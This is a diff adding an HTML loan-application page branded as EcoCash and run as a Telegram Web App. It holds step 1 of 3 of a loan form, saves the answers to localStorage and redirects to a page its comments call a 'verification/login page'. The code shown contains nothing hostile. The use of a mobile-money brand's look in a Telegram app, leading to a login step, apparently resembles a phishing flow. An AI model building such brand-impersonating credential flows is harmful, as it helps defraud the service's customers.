@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Loan Application</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f1f3f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: #0066ff;
+            padding: 15px 20px;
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .header-title .eco { color: #ffffff; }
+        .header-title .cash { color: #ff3333; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 92%;
+            max-width: 450px;
+            margin: 20px 0;
+            padding: 25px 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 24px;
+            color: #0066ff;
+            margin: 0 0 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: #ff4d4d;
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 16px;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #fcfcfc;
+            color: #333;
+            box-sizing: border-box;
+            outline: none;
+            width: 100%;
+        }
+
+        .form-control:focus {
+            border-color: #0066ff;
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23888888' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 15px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        textarea.form-control {
+            resize: none;
+            height: 100px;
+            font-family: inherit;
+        }
+
+        /* Button Styling */
+        .btn-next {
+            background-color: #0066ff;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        .btn-next:active {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a href="/" class="back-btn">← Back</a>
+    <div class="header-title">
+        <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
+    <span class="menu-icon">☰</span>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Loan Application</h1>
+    <div class="subtext">Step 1 of 3</div>
+
+    <!-- Step Bar Progress Indicators -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Application Form -->
+    <form id="loanForm" onsubmit="submitStep1(event)">
+        <div class="form-group">
+            <label for="loanType">Loan Type</label>
+            <select id="loanType" class="form-control" required>
+                <option value="Business Loan" selected>Business Loan</option>
+                <option value="Personal Loan">Personal Loan</option>
+                <option value="Educational Loan">Educational Loan</option>
+                <option value="Emergency Loan">Emergency Loan</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanAmt">Loan Amount (USD)</label>
+            <input type="number" id="loanAmt" class="form-control" placeholder="10000" required>
+        </div>
+
+        <div class="form-group">
+            <label for="loanTerm">Loan Term</label>
+            <select id="loanTerm" class="form-control" required>
+                <option value="6 months">6 months</option>
+                <option value="12 months">12 months</option>
+                <option value="18 months">18 months</option>
+                <option value="24 months">24 months</option>
+                <option value="36 months">36 months</option>
+                <option value="48 months" selected>48 months</option>
+                <option value="60 months">60 months</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="loanPurpose">Loan Purpose</label>
+            <textarea id="loanPurpose" class="form-control" placeholder="Describe the purpose of your loan..." required></textarea>
+        </div>
+
+        <button type="submit" class="btn-next">Next Step</button>
+    </form>
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Retrieve calculations stored from index.html
+        const savedAmount = localStorage.getItem('amount');
+        const savedDuration = localStorage.getItem('loanDuration');
+
+        if (savedAmount) {
+            document.getElementById('loanAmt').value = savedAmount;
+        }
+
+        if (savedDuration) {
+            const formattedDuration = savedDuration.toLowerCase(); // matches '60 months', '12 months' etc.
+            const selectEl = document.getElementById('loanTerm');
+            
+            // Loop and auto-select matching duration option if exists
+            for (let i = 0; i < selectEl.options.length; i++) {
+                if (selectEl.options[i].value === formattedDuration) {
+                    selectEl.selectedIndex = i;
+                    break;
+                }
+            }
+        }
+    };
+
+    function submitStep1(event) {
+        event.preventDefault();
+
+        const loanType = document.getElementById('loanType').value;
+        const loanAmt = document.getElementById('loanAmt').value;
+        const loanTerm = document.getElementById('loanTerm').value;
+        const loanPurpose = document.getElementById('loanPurpose').value;
+
+        // Save form configuration values to pass to verification/login page
+        localStorage.setItem('appliedLoanType', loanType);
+        localStorage.setItem('appliedAmount', loanAmt);
+        localStorage.setItem('appliedTerm', loanTerm);
+        localStorage.setItem('appliedPurpose', loanPurpose);
+
+        // Transition to next page (e.g., login or validation setup)
+        window.location.href = "/page3"; 
+    }
+</script>
+
+</body>
+</html>
